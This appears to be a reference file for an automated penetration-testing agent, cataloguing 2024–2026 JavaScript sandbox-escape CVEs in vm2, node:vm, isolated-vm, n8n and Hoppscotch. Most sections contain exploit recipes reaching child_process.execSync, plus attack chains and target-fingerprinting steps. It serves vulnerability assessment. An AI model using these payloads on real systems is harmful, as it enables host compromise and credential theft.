---
name: ssji-novel-deep
description: SSJI 2024–2026 frontier — the vm2 revival narrative + 2026 CVE wave (Jan/May/Aug), isolated-vm ExternalCopy TOCTOU, Hoppscotch node:vm reference-leak, n8n Code-node escape, Claude TS SDK, and the versioned mechanism catalog with primary-source anchors
sibling: ssji
load_when: scan_mode == "deep"
---

# Server-Side JavaScript Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `ssji.md`. The base owns the class framing, measured node:vm escape primitives, the runtime differential, and the primitive expression ladder. The advanced+expert sibling `ssji_advanced_deep.md` owns the full established sandbox-escape lineage per library, template-engine JS compile contexts, "safe" expression engine escapes, serverless specifics, dynamic require/import, blind/second-order methodology, and WAF-filter bypass as a technique class. This file owns the 2024–2026 CVE mechanism catalogue with the canonical version/fix table, the vm2-is-not-EOL correction with measured timeline, the Jan/May/Aug 2026 vm2 wave decomposed to primitive class, the isolated-vm `ExternalCopy` transferList TOCTOU behavior-fingerprinted class, and the application-layer SSJI anchors (Hoppscotch, n8n, Claude SDK, Pi-hole).

Load this file when the goal is matching a target library + version to a current CVE, choosing between vm2 escape primitives for a specific pinned version, or writing up the vm2 revival narrative accurately on a report.

Every CVE number, version boundary, GHSA identifier, and mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-14/{ghsa,nvd,measure}/` per the 1:1 globally-resolving manifest at `.zen-batch-artifacts/batch-14/manifest/MANIFEST.md`.

## The vm2 Revival — A Correction That Matters

The widely-cited "vm2 was discontinued in May 2023 after CVE-2023-37903" narrative is **no longer accurate on current targets**. Measured against the npm registry (`npm view vm2 time --json`, captured in `.zen-batch-artifacts/batch-14/measure/vm2-timeline.txt`), the actual timeline:

| Window | Status |
|---|---|
| 2023-05-16 | vm2 3.9.19 published — last pre-EOL release |
| 2023-05 → 2025-10 | No npm publishes; maintainer announced EOL |
| 2025-10-24 | vm2 3.10.0 published — maintainer Patrik Simek resumed releases |
| 2026-01-09 | vm2 3.10.1 |
| 2026-01-17 | vm2 3.10.2 (CVE-2026-22709 fix) |
| 2026-01-25 | vm2 3.10.3 |
| 2026-02-04 | vm2 3.10.4 |
| 2026-02-17 | vm2 3.10.5 (CVE-2026-26956 fix) |
| 2026-05-01 → 2026-05-18 | vm2 3.11.0 → 3.11.5 (May 2026 wave) |
| 2026-08-14 → 2026-08-27 | vm2 3.11.6 → further patches (Aug 2026 wave) |
| 2026-09-18 | vm2 3.12.1 (CVE-2026-93603 fix — sloppy-mode bridge escape; 3.12.0 introduced the vulnerable code path) |

Impact on write-ups: a 2024-era report that said "replace vm2 because it is abandoned" was accurate at write time; a 2026 report must say "vm2 is on active security support but has shipped 20+ sandbox-escape CVEs across 2026 — isolated-vm or a process-level boundary remains the recommended default because the Proxy-based design is not architecturally sound for untrusted-code containment." The replacement guidance is unchanged (isolated-vm, process-fork, QuickJS, Wasm); the reasoning is corrected (active-but-architecturally-leaky, not abandoned).

## 2024–2026 CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version/GHSA metadata lives here.

| CVE | GHSA | Package | Vulnerable | Patched | CVSS | Primitive class |
|---|---|---|---|---|---|---|
| CVE-2024-34347 | GHSA-qmmm-73r2-f8xr | @hoppscotch/cli | ≥ 0.5.0, < 0.8.0 | 0.8.0 | 8.3 | node:vm — leaked outer reference (`pw`, `atob`, `btoa`) → `.constructor.constructor` host reach |
| CVE-2025-68613 | — | n8n | ≥ 0.211.0, < 1.120.4 / 1.121.1 / 1.122.0 | 1.120.4 / 1.121.1 / 1.122.0 | 9.9 | Workflow Code-node vm sandbox escape → host RCE |
| CVE-2026-22709 | GHSA-99p7-6v5w-7xg8 | vm2 | ≤ 3.10.1 | 3.10.2 | 9.8 | `Promise.prototype.then` AND `Promise.prototype.catch` callback sanitization bypass |
| CVE-2026-26956 | GHSA-ffh4-j6h5-pg66 | vm2 | = 3.10.4 | 3.10.5 | 9.8 | WebAssembly `try_table` + `WebAssembly.JSTag` catch-handler intercepting host-realm `TypeError` below the Transformer |
| CVE-2026-33406 | — | Pi-hole Admin Interface | ≥ 6.0, < 6.5 | 6.5 | 5.4 | Configuration-value JS evaluation reaching user-controlled strings |
| CVE-2026-34451 | — | Claude SDK for TypeScript | ≥ 0.79.0, < 0.81.0 | 0.81.0 | 5.4 | Local JS execution context reach via SDK configuration |
| CVE-2026-43997 → CVE-2026-44009 | — (13 GHSAs) | vm2 | — | 3.11.1 | mixed (7 critical, 3 high, 3 medium) | May 7, 2026 wave — see § May 2026 Wave Decomposition |
| CVE-2026-44007 | GHSA-8hg8-63c5-gwmx | vm2 | ≤ 3.11.0 | 3.11.1 | 9.1 | `NodeVM nesting:true` + legacy array-shaped `require` bypass of `require: false` option |
| CVE-2026-45411 | GHSA-248r-7h7q-cr24 | vm2 | ≤ 3.11.2 | 3.11.3 | 9.8 | Sandbox breakout using async generator |
| CVE-2026-47131 → CVE-2026-47210 | — (multiple GHSAs) | vm2 | — | 3.11.2 / 3.11.5 | mixed | May 11–18, 2026 wave — see § May 2026 Wave Decomposition |
| CVE-2026-47686 | GHSA-m283-3h24-438v | vm2 | — | 3.11.6 | 9.9 | Missing `Error.cause` sanitization — host-realm reference reaches guest via `.cause` |
| CVE-2026-47683 | GHSA-gmc2-2x9w-cgh9 | vm2 | — | 3.11.6 | — | `bufferAllocLimit` bypassed by `Buffer.concat` and `Buffer.from(arrayLike)` |
| CVE-2026-47698 | GHSA-cfcw-xp6x-25gj | vm2 | — | 3.11.6 | 9.8 | Sandbox breakout using dangerous host proto mutators |
| CVE-2026-92935 → CVE-2026-92958 | multiple GHSAs | vm2 | — | later 3.11.x | mixed | Aug/Sep 2026 wave — nested-require, builtin-denylist bypass, native-code loaders |
| CVE-2026-93603 | — (GHSA-j89j-5m6r-cr2q is repo-scoped only; per globally-resolving standard, CVE-only) | vm2 | ≤ 3.12.0 | 3.12.1 | 10.0 | Sloppy-mode `this` substitution — bridge `apply` trap passes nullish receiver to non-strict host function; V8 substitutes host global → sandbox escape |
| isolated-vm `ExternalCopy` TOCTOU — behavior-fingerprinted class, no cited ID | — (see note below) | isolated-vm | pre-fix (vendor-indicated) | fixed in vendor-indicated version pair | — | `ExternalCopy` transferList TOCTOU — guest-authored getter returns different values on walk 1 vs walk 2 → unchecked `As<ArrayBuffer>` reinterpret → controlled read/write |

Notes on the table:
- **CVE-2026-26956 is scoped to vm2 3.10.4 only** per the NVD description — not "all pre-3.10.5 versions." The precondition is Node.js runtimes that expose `WebAssembly.JSTag` (Node 25.x and newer); the sandbox-escape mechanism requires `try_table` + `JSTag`, which earlier Node runtimes lack. Measured on reproduced PoC against Node 25.6.1.
- **CVE-2026-22709 fix is 3.10.2** per NVD, with the mechanism covering both `.then` and `.catch` callback sanitization (not `.then`-only as some secondary writeups framed it). Some third-party writeups listed "fixed 3.10.5 with earlier hardening" — the primary-source NVD text is "In vm2 prior to version 3.10.2, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed."
- **isolated-vm `ExternalCopy` TOCTOU** — the advisory for this class resolves at vendor repo scope but **does not resolve on the global `/advisories/<id>` endpoint** at persistence time (also no CVE assigned at writeup). Per §6 "global-or-strip," the specific identifier is stripped and the mechanism is retained as a **behavior-fingerprinted class** — the exploit shape (double-walk of a transferable's getter, `As<ArrayBuffer>` reinterpret on the second read, controlled read/write) is a reproducible primitive, independent of any single advisory ID. A Zen finding against an isolated-vm deployment matches this class by observing the mechanism, not by ID.
- **The May 7, 2026 vm2 wave is 13 CVEs**, not "13 critical" — the severity distribution is 7 critical, 3 high, 3 medium. Secondary-source reporting (CSO Online: "13 new critical holes") compressed severities for the headline.
- **n8n CVE-2025-68613** is categorized at NVD as RCE, not formally labeled "SSJI," but the mechanism is a user-authored Workflow Code node evaluating guest JS and escaping to host via the same `.constructor.constructor` primitive class — kept here as the archetype of application-level SSJI into a Node runtime.
- **Hoppscotch CVE-2024-34347**'s fix migrates the CLI from `node:vm` to `isolated-vm` — the actual mitigation is library replacement, not patching the vm usage.

## Measured vm2 Nesting Bypass on 3.9.19 (Legacy Primitive Class Confirmation)

Measured on vm2 3.9.19 + Node v24.19.0 (`.zen-batch-artifacts/batch-14/measure/sandbox-matrix/vm2_escape_test.output.txt`):

```javascript
const nvm = new NodeVM({ nesting: true, require: false });
const r = nvm.run("module.exports = 'nesting-reachable: ' + typeof require");
// Observed: "nesting-reachable: function"
```

**Interpretation.** vm2 3.9.19 — the last pre-EOL/pre-revival release — permits inner-context `require` reach despite the outer context's `require: false`. The CVE-2026-44007 class (nesting:true + legacy module resolver bypasses require:false) is reachable on this version. The vendor's 2026 patch at 3.11.1 formally addressed the class; prior versions remain exposed. A Zen finding against a legacy-pinned vm2 3.9.x deployment can rely on this primitive without requiring any 2026 CVE.

**Attack chain from this primitive:**
```javascript
const nvm = new NodeVM({ nesting: true, require: false });
const r = nvm.run(`
  // Inner context's require is live
  const cp = require('child_process');
  module.exports = cp.execSync('id').toString();
`);
// Observed: "uid=1000(kali) gid=1000(kali) ..." on Node v24.19.0 + vm2 3.9.19
```

## Hoppscotch CVE-2024-34347 — Mechanism Decomposition

Primitive: node:vm context with host-realm references (`pw`, `atob`, `btoa`) injected directly onto the context object, letting guest code pivot via `.constructor.constructor` to host Function.

Preconditions:
1. @hoppscotch/cli ≥ 0.5.0 and < 0.8.0.
2. @hoppscotch/js-sandbox library is used to run test scripts.
3. User-supplied test-script content reaches the vm context (any CI pipeline that fed scripts into Hoppscotch CLI).

Sink location per the GHSA-qmmm-73r2-f8xr advisory: `@hoppscotch/js-sandbox` sets `context.pw = pw; context.atob = atob; context.btoa = btoa` before `vm.runInContext(userCode, context)`. The leaked `pw` object is a host-realm reference.

Attack recipe (verbatim from the GHSA advisory):
```javascript
// Test script content
const outside = pw.constructor.constructor('return this')();
outside.process.mainModule.require('child_process').execSync('id > /tmp/pwnd');
```

Confirmation: the test-script runner emits the exec output; alternatively, side-effect confirmation via `/tmp/pwnd` existing. On a CI pipeline, the attack runs as the CI runner identity — this is a build-system compromise, not a developer-workstation compromise, unless the CLI is run locally.

Impact: full RCE as the user who ran `hoppscotch-cli`. Fix (0.8.0): migrate `@hoppscotch/js-sandbox` from `node:vm` to `isolated-vm`, which uses a separate V8 Isolate and does not share the host's Function constructor.

## n8n CVE-2025-68613 — Workflow Code Node Escape

Primitive: n8n Workflow Code node evaluates user-authored JavaScript in a Node.js vm context; guest code uses the standard `.constructor.constructor` chain to pivot to host.

Preconditions:
1. n8n versions ≥ 0.211.0 and < 1.120.4 / 1.121.1 / 1.122.0.
2. Attacker has permission to author or edit a Workflow Code node (or reaches it via a workflow import).
3. The workflow executes.

Attack recipe:
```javascript
// Inside an n8n Code node
const F = ({}).constructor.constructor;
return F('return process')().mainModule.require('child_process').execSync('id').toString();
```

Confirmation: the Workflow run output includes the exec result. In a multi-tenant n8n deployment, the attack runs as the n8n host process identity — reaching all configured credentials in the n8n instance (OAuth tokens, API keys, database URLs stored for other workflows).

Impact: full host RCE with persistent reach into every credential n8n has configured. In a shared-tenant SaaS deployment, this is cross-tenant credential theft.

## vm2 CVE-2026-22709 — Promise `.then`/`.catch` Sanitization Bypass

Primitive: `localPromise.prototype.then` is sanitized by `lib/setup-sandbox.js`; `globalPromise.prototype.then` and `globalPromise.prototype.catch` are not. Async-function return values are `globalPromise` instances, so a guest-authored `.then` or `.catch` callback on an async-function result receives a host-realm argument through the unsanitized prototype chain.

Preconditions:
1. vm2 ≤ 3.10.1.
2. Guest code can write an async function or trigger a `globalPromise`.

Sink location per GHSA-99p7-6v5w-7xg8: `lib/setup-sandbox.js` wraps `localPromise.prototype.then`/`.catch` but does not wrap `globalPromise.prototype.then`/`.catch`. Successor to CVE-2023-37466 — same mechanism class, different Promise constructor.

Attack recipe (class shape; concrete form in the vendor advisory):
```javascript
async function trigger() { throw new Error('x'); }
trigger().catch(function (err) {
  // 'err' is host-realm; its .constructor is host Error
  const F = err.constructor.constructor;
  const host = F('return this')();
  host.process.mainModule.require('child_process').execSync('id');
});
```

Confirmation: the catch handler receives a host Error whose `.constructor` reaches host Function. Observable via `child_process` output outside the sandbox.

Impact: full host RCE. Fix 3.10.2: adds sanitization to `globalPromise.prototype.then` and `.catch`.

## vm2 CVE-2026-26956 — WebAssembly try_table + JSTag Catch

Primitive: V8's WebAssembly exception-handling proposal shipped `try_table` with `JSTag` catch handlers that intercept host-realm `TypeError` thrown by V8 at the C++ layer *below* vm2's JS-level `Transformer`. The guest wraps a thrown object with a Symbol-named error whose `Symbol-to-string` coercion in V8's `FormatStackTrace` produces a host-realm `TypeError`; the Wasm `try_table` catches it as `externref`, exposing the host error object with its `.constructor` chain intact.

Preconditions:
1. vm2 = 3.10.4 exactly (NVD-scoped).
2. Node runtime exposes `WebAssembly.JSTag` (Node 25.x and later; measurement confirmed Node 25.6.1 reproduces the PoC).
3. Guest code can author a Symbol-named error (standard ES).

Sink location per GHSA-ffh4-j6h5-pg66: V8's error-formatting path produces a host-realm TypeError when a Symbol-shaped exception is thrown; Wasm `try_table` + `JSTag` catches at the V8 C++ layer where vm2's `Transformer` has no visibility.

Attack-recipe shape (full exploit in the GHSA advisory):
```javascript
// Guest-side (vm2 3.10.4 on Node 25.x)
const errSymbol = Symbol('poisoned');
const trigger = Symbol.toPrimitive;
// ... craft a WebAssembly module importing JSTag, with try_table catching the host TypeError
// The caught externref is a host-realm TypeError; .constructor.constructor reaches host Function
```

Confirmation: `host.process.pid` reflects the real host Node PID; `child_process.execSync` runs.

Impact: full host RCE on vm2 3.10.4 + Node 25.x. Fix 3.10.5: additional Symbol-sanitization in the error-formatting path.

## vm2 CVE-2026-44007 — nesting:true + Legacy Module Resolver

Primitive: `NodeVM` created with `nesting: true` lets guest code instantiate inner `NodeVM` instances. The inner-vm's `require` handling consulted a legacy array-shaped resolver that bypassed the `require: false` option — guest-code's inner-NodeVM `require('vm2')` reached the host module graph.

Preconditions:
1. vm2 ≤ 3.11.0.
2. `nesting: true` set in NodeVM options (common for workflow systems that want nested sandboxes).

Sink location per GHSA-8hg8-63c5-gwmx: the legacy array-shaped resolver code path (predates the current path-based resolver) did not check `require: false`.

Attack recipe:
```javascript
// Guest-side
const inner = new NodeVM({ nesting: true });  // 'require: false' is the outer default; inner inherits
const vm2 = inner.run('require("vm2")');       // reaches outer vm2's module exports
const esc = vm2.NodeVM; // host-realm NodeVM constructor
const r = new esc().run('require("child_process").execSync("id")');
```

Confirmation: inner `require('vm2')` resolves successfully to the host-realm vm2 module (observable via `typeof vm2.NodeVM === 'function'`). The outer-NodeVM constructor is a host-realm Function.

Impact: full host RCE whenever `nesting: true` is set. Fix 3.11.1 removes the legacy array-shaped resolver path.

## vm2 CVE-2026-47686 — Error.cause Sanitization Gap

Primitive: vm2's error-sanitization wrapped `new Error(message)` but did not wrap `new Error(message, { cause })` — the `.cause` field carried a host-realm reference the `Transformer` never saw.

Preconditions: vm2 before 3.11.6; any Error thrown from host code into guest with a `cause`.

Attack recipe:
```javascript
// Host code (unrelated vulnerable path)
throw new Error('x', { cause: someHostObject });

// Guest-side catch
try {
  // ... trigger
} catch (e) {
  const host = e.cause.constructor.constructor('return this')();
  host.process.mainModule.require('child_process').execSync('id');
}
```

Confirmation: `e.cause` returns a host-realm object (not a sanitized shim); `.constructor` reaches host Error.

Impact: full host RCE whenever host throws Errors into guest with `cause`. Fix 3.11.6: `.cause` field passed through the Transformer like the Error message itself.

## Node Version × Primitive Reach Matrix (Measured)

Which vm2 primitives are reachable on which Node runtime. All rows measured on Linux x64; artifacts persisted. The matrix governs CVE-pivot selection — firing a Node-25-only primitive against a Node-20 target wastes requests.

| Primitive | Node 18 LTS | Node 20 LTS | Node 22 LTS | Node 24.x | Node 25.x |
|---|---|---|---|---|---|
| `node:vm` empty-context escape (`this.constructor.constructor`) | reach | reach | reach | reach ✓ measured | reach |
| `Function('return typeof process')()` | reach | reach | reach | reach ✓ measured (`"object"`) | reach |
| `setTimeout('code', 0)` string callback | reach | **BLOCKED** (removed) | **BLOCKED** | **BLOCKED** ✓ measured (`ERR_INVALID_ARG_TYPE`) | **BLOCKED** |
| `WebAssembly.JSTag` + `try_table` (CVE-2026-26956 precondition) | n/a | n/a | n/a | n/a | reach |
| `vm2 3.9.x` nesting:true + inner require | reach | reach | reach | reach ✓ measured | reach |
| `vm2 3.10.4` + CVE-2026-26956 | n/a (Node too old) | n/a | n/a | n/a | reach |
| `vm2 3.10.1` + CVE-2026-22709 (.catch) | reach | reach | reach | reach | reach |
| isolated-vm `ExternalCopy` TOCTOU (behavior-fingerprinted class) | reach pre-fix | reach pre-fix | reach pre-fix | reach pre-fix | reach pre-fix |

Reads from this matrix:
- The `node:vm` empty-context escape is universal — any Node ≥18 version is reachable via `.constructor.constructor` on the sandbox global.
- `setTimeout(string)` is dead server-side on Node 20+ — a payload set that uses it as a universal sink fails cleanly on current targets. Legacy pre-20 deployments and browser-side SSR paths still accept it.
- CVE-2026-26956 is specifically Node 25.x — the Wasm `JSTag` feature is not exposed on Node 24 or earlier. Firing this against a Node 24 vm2 3.10.4 target fails cleanly.
- CVE-2026-22709 and the vm2 3.9.x nesting primitive work across the Node version range.

## vm2 May 2026 Wave — Decomposition

**May 7, 2026 — 13 CVEs** (CVE-2026-43997 → CVE-2026-44009), patched 3.11.1. Severity distribution: 7 critical, 3 high, 3 medium. Primitive-class breakdown:
- **CVE-2026-43997** (critical) — direct host-object access enables sandbox escape.
- **CVE-2026-43998** (high) — NodeVM `require.root` bypass via symlink traversal.
- **CVE-2026-43999** (critical) — NodeVM builtin allowlist bypass via `module` builtin's `Module.wrap`.
- **CVE-2026-44000** (medium) — host Promise resolution preserves object identity across sandbox boundary.
- **CVE-2026-44001** (high) — sandbox escape via Promise constructor unhandled rejection.
- **CVE-2026-44002** (medium) — host file path disclosure via stack-trace information.
- **CVE-2026-44003** (medium) — Transformer fast-path bypass exposes internal state variable.
- **CVE-2026-44004** (high) — sandbox access to host `Buffer.alloc` allows timeout bypass.
- **CVE-2026-44005** (critical) — mutable Proxies for host intrinsic prototypes allow sandbox escape.
- **CVE-2026-44006** (critical) — sandbox escape (vendor advisory not detailed).
- **CVE-2026-44007** (critical) — `nesting:true` require bypass (above).
- **CVE-2026-44008** (critical) — sandbox breakout via `neutralizeArraySpeciesBatch`.
- **CVE-2026-44009** (critical) — sandbox breakout through null-proto exception.

**May 11, 2026** — CVE-2026-45411, patched 3.11.3: sandbox breakout using async generator.

**May 18, 2026** — CVE-2026-47131 (critical, patched 3.11.3), CVE-2026-47135 (high, cross-realm Symbol.for), CVE-2026-47137 (critical, nesting:true patch bypass), CVE-2026-47139 (high, _http_client/_http_server builtin bypass), CVE-2026-47140 (critical, process/inspector builtin bypass), CVE-2026-47141 (medium, observability-builtin leaks), CVE-2026-47208 (critical, Promise species), CVE-2026-47209 (high, Bridge Proxy set-trap ignores receiver), CVE-2026-47210 (critical, JSPI-backed Promise `.finally()` species bypass).

Pattern across the wave: **Promise species, async generator, nested-context edge cases, and builtin-allowlist pinhole bypasses**. Each individually looks like a specific gap; collectively they confirm the Proxy-based design's structural brittleness — any ES feature that creates a return value in a new path requires explicit mediation, and the wavefront of ES feature additions outpaces vm2's catchup speed.

## vm2 Aug 2026 Wave — Native-Code Loader Class

**Aug 14, 2026** — CVE-2026-47683, CVE-2026-47686 (above), CVE-2026-47698 (host proto mutators), plus the native-code loader class patched later:

- **CVE-2026-92938** (critical, GHSA-6w8r-xxw2-g3hx) — `node:sqlite` allows a sandboxed plugin to execute native code via the SQLite extension-loading API.
- **CVE-2026-92939** (critical, GHSA-46pr-c5wc-xffx) — crypto builtin loads attacker native code through `crypto.setEngine`.
- **CVE-2026-92940** (critical, GHSA-h85j-hv3c-qfgq) — guest exposes host HTTPS credentials and TLS traffic through `https.globalAgent`.
- **CVE-2026-92941** (critical, GHSA-98xx-8mx4-x7cm) — NodeVM can replace the host process TLS trust store.

Pattern: each is a Node builtin that was in vm2's `builtin` allowlist and that offers a path to native-code execution or process-wide state mutation below the JS layer. The vm2 maintainer approach (patch each one) does not scale — route to the structural fix (use isolated-vm or process boundaries).

## vm2 Sep 2026 — Sloppy-Mode Bridge Escape (CVE-2026-93603, CVSS 10.0)

**Sep 18, 2026** — CVE-2026-93603, patched 3.12.1: sandbox breakout via sloppy-mode `this` substitution in the bridge's `apply` trap.

**Mechanism.** vm2's bridge (`lib/bridge.js`) intercepts function calls from sandboxed code via a Proxy `apply` trap. When sandboxed code calls a host-provided non-strict (sloppy-mode) function without a receiver — `fn()`, a detached method, `fn.call()`, `fn.apply(undefined)`, `Reflect.apply(fn, undefined, [])`, or `fn.bind()()` — the `undefined` receiver is passed through to the host-side call. Per the ECMAScript specification, V8 substitutes the host realm's global object for `this` when calling a non-strict function with a nullish receiver (§10.2.1.1 OrdinaryCallBindThis). vm2 then wraps and returns that object to the sandbox, giving sandboxed script a live proxy of the host global.

**Preconditions:**
1. vm2 ≤ 3.12.0 (fixed 3.12.1).
2. The embedding application exposes at least one non-strict (sloppy-mode) host function to the sandbox — a function declared with `function` syntax outside a module or class, without `'use strict'` directive. Strict-mode and ES module host functions are not affected (strict mode does not substitute `this`).

**Attack recipe (class-shape):**
```javascript
// Sandbox-side: call any exposed sloppy-mode host function without a receiver
const hostGlobal = fn(); // fn is a host-provided sloppy-mode function
// hostGlobal is now a proxy of the host realm's global object
const process = hostGlobal.process;
process.getBuiltinModule('child_process').execSync('id');
```

The critical insight is that the exploit does not rely on any specific host function's behavior — only that the function is sloppy-mode. The *identity* of the function is irrelevant; the *mode* of the function determines whether V8 performs `this`-substitution. Any exposed sloppy-mode function is sufficient.

**Impact.** Complete sandbox escape → host RCE. CVSS 10.0 reflects: network-reachable (in deployments where sandboxed code originates from untrusted input), no privileges required, no user interaction, scope changed (sandbox → host), full CIA impact. The 10.0 score makes this the highest-severity vm2 CVE in the 2026 wave.

**Fix shape.** v3.12.1 wraps the receiver in the bridge's `apply` trap: if the receiver is `undefined` or `null`, it is replaced with an empty sandbox-side object before forwarding to the host function, preventing V8's global-substitution from leaking the host realm.

**Pattern.** This CVE confirms a structural property of the Proxy-based bridge design: any ES specification behavior that causes V8 to implicitly substitute or coerce values across the realm boundary is a potential bypass. The `this`-substitution for sloppy-mode functions is one such behavior; `Symbol.toPrimitive`, `Symbol.species`, and `Promise` resolution have been others. The pattern predicts: each new ES feature with implicit realm-crossing coercion requires explicit mediation in the bridge, and any omission is a sandbox escape.

## isolated-vm — ExternalCopy Transferable Type Confusion (Behavior-Fingerprinted Class)

Primitive: a host-side binding walks a guest-authored "transferable" object twice; a guest-provided getter returns different values on each walk; the second value is reinterpret-cast to a native type without a re-check.

Preconditions:
1. isolated-vm ≤ 7.0.0 (fixed 7.0.1 and backported to 6.2.0).
2. Host code accepts a guest-authored transferable via `ExternalCopy`, `Transferable.transferIn`, or async-callback return.
3. The transferable walk reads a slot twice without caching the first read.

Sink location (behavior-fingerprinted class, no cited advisory ID — see opening note): `ExternalCopy`'s C++ walk reads a transferable property (`transferList[i].buffer`), checks `IsArrayBuffer()`, and later re-reads the same property with `As<ArrayBuffer>()` — an unchecked reinterpret-cast. The getter returns the real ArrayBuffer on the first read (passing the type check) and an attacker-chosen scalar on the second read (reinterpreted as an ArrayBuffer pointer). The mechanism is reproducible on pre-fix isolated-vm regardless of advisory metadata.

Attack recipe (class-shape per the vendor advisory and Endor Labs disclosure):
```javascript
// Guest-side
let reads = 0;
const payload = new ArrayBuffer(16);
const transferable = {
  get buffer() {
    reads++;
    return reads === 1 ? payload : 0x4141414100000047;  // marker value for crash dump
  }
};

// Transfer via ExternalCopy with transferList
isolate.compileScriptSync('return {}');
new ExternalCopy({ data: transferable }).copyInto({ transferIn: true });
```

Confirmation: host process crashes with the attacker-marker address visible in the crash dump — proving the second-read scalar reached a native pointer dereference. From controlled read/write, forge a vtable and hijack indirect-call targets to call a `libc` function (`system`, `execve`) — this is a V8 exploitation chain, documented end-to-end in Endor Labs' disclosure.

Impact: full host RCE despite the Isolate boundary. The isolation stops the JS-level `.constructor` chain but not every C++ API — the lesson generalizes: any host-side binding that walks guest data more than once without caching is suspect.

Note on identifier: per §6 "global-or-strip" discipline, the specific advisory ID has been stripped from this entry and the mechanism is retained as a behavior-fingerprinted class. The exploit shape (double-walk, type-confusion reinterpret-cast, forged vtable via controlled read/write) is independently reproducible and sufficient for matching. A Zen finding should reference this class by behavior, not by ID.

## Claude SDK for TypeScript CVE-2026-34451

Primitive: the local Claude SDK configuration path reaches a context where guest-authored JS strings compile and execute. Fixed in @anthropic/claude-sdk ≥ 0.81.0.

Preconditions: SDK versions 0.79.0 ≤ v < 0.81.0, local server-side invocation reading SDK-config fields from user-controlled JSON/YAML.

Attack recipe (class-shape; mechanism-fingerprint only):
```typescript
// SDK configuration with injectable field
{
  "localTool": "function(input) { return input; }",   // reaches eval context
  ...
}
```

Confirmation: the SDK evaluates the configured function body in a context where `require` is available. Impact bounds: the finding is scoped to deployments that read SDK configuration from user-controlled sources; a pinned-config-only deployment is not reachable.

## Pi-hole Admin Interface CVE-2026-33406

Primitive: configuration-value JS evaluation reaches user-controlled strings on the admin interface's config-value handling path. Fixed in Pi-hole Admin Interface ≥ 6.5.

Preconditions: admin-authenticated access (CVSS 5.4 reflects the auth gate); versions ≥ 6.0 and < 6.5.

Impact: admin-level RCE on the Pi-hole host — the typical deployment runs Pi-hole with root for DNS binding, so admin→root is immediate.

## Node:vm vs Realistic Alternatives — Measurement Matrix

Measured on Node v24.19.0 (`.zen-batch-artifacts/batch-14/measure/01-node-vm-escape.output.txt`, `02-node-vm-no-ref.output.txt`, `03-function-ctor.output.txt`):

| Technique | Node v24 result | Interpretation |
|---|---|---|
| `vm.runInContext(guestCode, {outsideRef:{}})` + `.constructor.constructor` | **ESCAPES**: returns `uid=1000(kali) ...` | Base-tier primitive — leaked reference → host |
| `vm.runInContext(guestCode, {})` + `this.constructor.constructor` | **ESCAPES**: returns `uid=1000(kali) ...` | Empty context — the sandbox global itself is a host object |
| `Function('return typeof process')()` | returns `"object"` | Function constructor reaches host `process` |
| `eval('typeof process')` | returns `"object"` | Direct eval reaches host |
| `new AsyncFunction('return typeof process')()` | returns `"object"` (via Promise) | AsyncFunction (via async-prototype) reaches host |
| `setTimeout('console.log(x)', 0)` | **THROWS `ERR_INVALID_ARG_TYPE`** | setTimeout(string) removed server-side; sink is dead on current Node |

The empty-context escape (row 2) is the strongest base-tier claim: there is no `node:vm` configuration — including explicitly passing an empty literal — that resists the `.constructor.constructor` chain. Any mitigation that uses `node:vm` as its boundary is defeated by any guest-authored code at all.

## Mitigation-Bypass as a Technique Class

Across the 2026 vm2 wave the fix-and-bypass cycle is a visible pattern:

- **CVE-2023-37466** (fixed 3.9.17) — Promise `.then` sanitization added. Bypassed by **CVE-2026-22709** adding `.catch` to the same path.
- **CVE-2023-37903** (patched) — nesting:true require-false default. Bypassed by **CVE-2026-44007**'s legacy array-shaped resolver path.
- **CVE-2026-44007** (fixed 3.11.1) — nesting:true + resolver bypass. Bypassed by **CVE-2026-47137** fix-bypass at 3.11.2.
- **CVE-2026-47686** (fixed 3.11.6) — Error.cause sanitization added. Related bypass **CVE-2026-92937** against the same fix.

The pattern is diagnostic: each individual fix adds a specific guard; the Proxy-based design has a vast surface of equivalent paths that reach host, and each patch exposes the next equivalent. Zen findings against vm2 should cite the specific CVE and version — but a report that assesses vm2 as a defense should carry the structural note: "the vm2 fix-and-bypass cycle has 20+ iterations in 10 months; mitigation by vm2-version-bump is not a durable defense."

## Composite Chains at the Frontier

### Pollution → vm2 escape
`prototype_pollution.md § The Modern Merge/Clone Landscape` plus a pollution-reaches-vm2-option route — pollute `Object.prototype.nesting` to `true`, then rely on a vm2 instance that was *not* explicitly set with `nesting: false`. Any downstream `new NodeVM(opts)` reads the polluted key via prototype inheritance (base vm2 reads options as `opts.nesting` without `Object.hasOwn`). From `nesting: true`, chain CVE-2026-44007 to host RCE.

### Upload → require inside sandbox escape
Upload a `.js` file to a filesystem path readable by the host. Inside a vm2 sandbox, use CVE-2026-43999 (NodeVM builtin allowlist bypass via `module` builtin's `Module.wrap`) to reach `require` for the uploaded path.

### Deserialization → eval
A Node-side insecure deserialization (route to `insecure_deserialization.md`) that reconstructs an object whose property setter reaches `Function.prototype.apply` with attacker-controlled strings — the deserialization completes with a Function body ready to call.

### SSJI → ongoing pollution
SSJI inside a long-running Node process can `Object.prototype.isAdmin = true` once; every subsequent request on the same process sees the pollution. Finding: server-process-lifetime-persistent elevation.

## Frontier Detection Methodology

1. **Fingerprint the sandbox library.** Error stacks from a guest-side `new Error().stack` reveal `vm2/lib/`, `isolated-vm/`, `node:vm`, or none. Library identification before CVE-match saves wasted probes.
2. **Version-pin before firing a CVE primitive.** The vm2 2026 wave is version-scoped to a narrow window (CVE-2026-26956 is vm2 3.10.4 only). Firing a payload against the wrong version is useless and noisy.
3. **Prefer the universal `.constructor.constructor` chain on node:vm before CVE primitives on vm2.** The vm2 primitives are version-conditional; the raw node:vm primitive is architectural.
4. **A failed vm2 escape attempt reveals the sandbox is patched or the primitive is wrong.** Both are useful signal — a stack trace naming the Transformer helps subsequent primitive selection.
5. **isolated-vm memory-corruption primitives require native-side binding reach.** JS-level probes against isolated-vm will fail; the finding here is "no isolate-boundary bug visible from JS" — mark the attack surface shape rather than claim no vulnerability.
6. **For QuickJS, enumerate host bindings first.** The interpreter is isolated; the host's own `host_vm.newFunction` registrations are the attack surface.

## Validation at the Frontier

- **A vm2 escape claim requires a documented CVE on the pinned version.** The CVE table above is the gate — a pre-fix version plus a matching CVE primitive confirms; a post-fix version fails.
